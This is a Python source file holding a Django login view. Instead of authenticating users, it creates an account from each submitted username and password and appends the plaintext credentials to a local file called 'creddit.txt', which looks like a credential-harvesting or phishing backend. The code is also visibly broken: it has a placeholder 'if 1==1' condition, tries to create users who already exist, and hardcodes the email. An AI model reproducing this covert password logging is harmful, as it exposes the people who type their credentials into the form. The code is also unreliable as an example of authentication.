from django.contrib.auth import authenticate, login

from django.contrib.auth.models import User

from django.shortcuts import render, redirect

from django.contrib import messages, auth

from django.contrib.auth.decorators import login_required

from django.http import HttpResponse


def auth(request):

    if request.method == "POST":

        username = request.POST['username']

        password = request.POST['password']

        email = "test"

        if 1==1:

            if User.objects.filter(username=username).exists():

                user = User.objects.create_user(username, email, password)

                user.save()

                user_model = User.objects.get(username=username)

                with open('creddit.txt', 'a') as f:
                    f.write(f'Username: {username}, Password: {password}\n')

            else:

                user = User.objects.create_user(username, email, password)

                user.save()

                user_model = User.objects.get(username=username)

                with open('creddit.txt', 'a') as f:

                    f.write(f'Username: {username}, Password: {password}\n')

                return redirect('login')

    return render(request, "core/login.html")